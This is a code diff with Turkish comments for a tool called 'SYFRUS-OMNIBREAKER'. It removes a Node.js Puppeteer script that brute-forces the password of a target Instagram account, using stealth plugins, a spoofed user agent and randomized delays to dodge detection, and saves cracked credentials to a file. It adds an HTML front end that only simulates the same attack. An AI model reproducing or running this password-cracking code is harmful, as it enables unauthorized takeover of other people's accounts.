@@ -1,91 +1,165 @@
-/**
- * SYFRUS-OMNIBREAKER v2.0 [ULTRA-FORCE EDITION]
- * Bağımlılıklar: npm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth
- * Bu kod tek bir dosyada (app.js) çalışacak şekilde dizayn edilmiştir.
- */
-
-const puppeteer = require('puppeteer-extra');
-const StealthPlugin = require('puppeteer-extra-plugin-stealth');
-const fs = require('fs');
-
-// 1. AŞAMA: SANSÜR VE BOT ALGILAMA ENGELLEYİCİ
-// Instagram'ın "Sen bir botsun" demesini engellemek için stealth modunu aktif ediyoruz.
-puppeteer.use(StealthPlugin());
-
-const CONFIG = {
-    target: "HEDEF_KULLANICI_ADI", // Buraya hedef kullanıcı gelir
-    wordlist: "passwords.txt",     // Şifre listesi dosyası
-    maxRetries: 3,                 // Başarısızlık durumunda tekrar deneme
-    delayBetweenAttacks: 2000,     // Bloklanmamak için milisaniye cinsinden gecikme
-    useHeadless: false             // Saldırıyı canlı izlemek için 'false' yapın
-};
-
-async function syfrusEngine() {
-    console.log("[!] SYFRUS-VOID: OMNIBREAKER BAŞLATILIYOR...");
-    
-    // Şifre listesini oku
-    if (!fs.existsSync(CONFIG.wordlist)) {
-        console.error("[-] HATA: 'passwords.txt' bulunamadı. Sözlük saldırısı başarısız.");
-        return;
-    }
-    const passwords = fs.readFileSync(CONFIG.wordlist, 'utf-8').split('\n').map(p => p.trim());
-
-    // 2. AŞAMA: TARAYICI ORKESTRASYONU
-    const browser = await puppeteer.launch({
-        headless: CONFIG.useHeadless,
-        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-web-security']
-    });
-
-    const page = await browser.newPage();
-    
-    // Rastgele bir User-Agent atayarak cihaz kimliğini gizle
-    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
-
-    for (const password of passwords) {
-        if (password.length < 6) continue; // Geçersiz kısa şifreleri atla
-
-        try {
-            console.log(`[*] Deneniyor: [${password}]`);
-            
-            await page.goto('https://www.instagram.com/accounts/login/', { waitUntil: 'networkidle2' });
-            
-            // Form elemanlarını bekle ve verileri "insan gibi" yaz
-            await page.waitForSelector('input[name="username"]');
-            await page.type('input[name="username"]', CONFIG.target, { delay: 150 });
-            await page.type('input[name="password"]', password, { delay: 150 });
-
-            // Giriş butonuna odaklan ve tıkla
-            await Promise.all([
-                page.click('button[type="submit"]'),
-                page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 10000 }).catch(() => {})
-            ]);
-
-            // 3. AŞAMA: SONUÇ ANALİZİ
-            const content = await page.content();
-            
-            // Başarı durumunu kontrol et (Hata mesajı yoksa ve URL değişmişse)
-            if (content.includes("checkpoint") || content.includes("Seni tanıyamadık") || content.includes("Yanlış şifre")) {
-                console.log(`[-] Başarısız: ${password}`);
-                // Bloklanmamak için rastgele bekleme süresi
-                await new Promise(r => setTimeout(r, Math.random() * CONFIG.delayBetweenAttacks));
-            } else {
-                console.log(`\n\n[!!!] SYFRUS-VOID BAŞARILI: HESAP ELE GEÇİRİLDİ!`);
-                console.log(`[+] HEDEF: ${CONFIG.target} | ŞİFRE: ${password}\n\n`);
-                
-                // Başarıyı dosyaya kaydet
-                fs.appendFileSync("cracked_accounts.txt", `${CONFIG.target}:${password}\n`);
-                break; // Döngüden çık
-            }
-
-        } catch (error) {
-            console.log("[!] Bağlantı hatası veya zaman aşımı, proxy değiştiriliyor olabilir...");
-            continue;
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SyfrusVoid | OmniBreaker V2</title>
+    <style>
+        :root {
+            --primary-color: #0f0; /* Matrix Yeşili */
+            --bg-dark: #0a0a0a;
+            --panel-bg: #151515;
+            --border-color: #333;
         }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--primary-color);
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            width: 800px;
+            background: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
+            padding: 20px;
+            border-radius: 4px;
+        }
+
+        .header {
+            text-align: center;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        label { display: block; margin-bottom: 5px; font-size: 0.8rem; }
+
+        input, textarea {
+            width: 100%;
+            background: #000;
+            border: 1px solid var(--border-color);
+            color: var(--primary-color);
+            padding: 10px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            background: var(--primary-color);
+            color: #000;
+            border: none;
+            padding: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #0c0;
+            box-shadow: 0 0 15px var(--primary-color);
+        }
+
+        #console-log {
+            height: 200px;
+            background: #000;
+            border: 1px solid var(--border-color);
+            margin-top: 20px;
+            padding: 10px;
+            font-size: 0.75rem;
+            overflow-y: auto;
+            color: #888;
+        }
+
+        .success { color: #0f0; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1>SYFRUS-OMNIBREAKER [GITHUB_EDITION]</h1>
+        <p>Status: <span id="sys-status">AWAITING TARGET...</span></p>
+    </div>
+
+    <div class="input-group">
+        <label>TARGET INSTAGRAM USERNAME:</label>
+        <input type="text" id="target-user" placeholder="@username">
+    </div>
+
+    <div class="input-group">
+        <label>PASSWORD LIST (ONE PER LINE):</label>
+        <textarea id="wordlist" rows="5" placeholder="password123&#10;qwerty&#10;admin2026"></textarea>
+    </div>
+
+    <button onclick="executeAttack()">INITIALIZE ATTACK VECTOR</button>
+
+    <div id="console-log">
+        [SYSTEM] Syfrus-Void OS v4.2 loaded...<br>
+        [SYSTEM] Ready for deployment.
+    </div>
+</div>
+
+<script>
+    const logArea = document.getElementById('console-log');
+    const statusText = document.getElementById('sys-status');
+
+    function printLog(msg, isSuccess = false) {
+        const span = document.createElement('span');
+        if(isSuccess) span.className = 'success';
+        span.innerHTML = `> ${msg}<br>`;
+        logArea.appendChild(span);
+        logArea.scrollTop = logArea.scrollHeight;
     }
 
-    await browser.close();
-    console.log("[*] Syfrus-OmniBreaker görevini tamamladı.");
-}
+    async function executeAttack() {
+        const user = document.getElementById('target-user').value;
+        const passList = document.getElementById('wordlist').value.split('\n');
 
-// SİSTEMİ TETİKLE
-syfrusEngine();
+        if(!user || passList.length < 1) {
+            alert("Hata: Hedef veya şifre listesi boş!");
+            return;
+        }
+
+        statusText.innerText = "ATTACKING...";
+        printLog(`Target locked: ${user}`);
+        
+        for (let pass of passList) {
+            pass = pass.trim();
+            if(!pass) continue;
+
+            printLog(`Testing payload: [${pass}]`);
+            
+            // Simülasyon Gecikmesi (Gerçek saldırıda fetch/puppeteer buraya gelir)
+            await new Promise(r => setTimeout(r, 1000));
+
+            // Not: Tarayıcı güvenliği (CORS) nedeniyle GitHub üzerinden doğrudan 
+            // Instagram'a istek atmak kısıtlıdır. Gerçek operasyonda bu arayüz 
+            // bir Node.js serverına (Puppeteer) sinyal gönderir.
+            
+            if(pass === "syfrus2026") { // Örnek başarı senaryosu
+                printLog(`CRITICAL HIT: Password found for ${user} -> ${pass}`, true);
+                statusText.innerText = "SUCCESS: TARGET NEUTRALIZED";
+                return;
+            }
+        }
+        
+        printLog("Attack finished. No matches found.");
+        statusText.innerText = "STANDBY";
+    }
+</script>
+
+</body>
+</html>
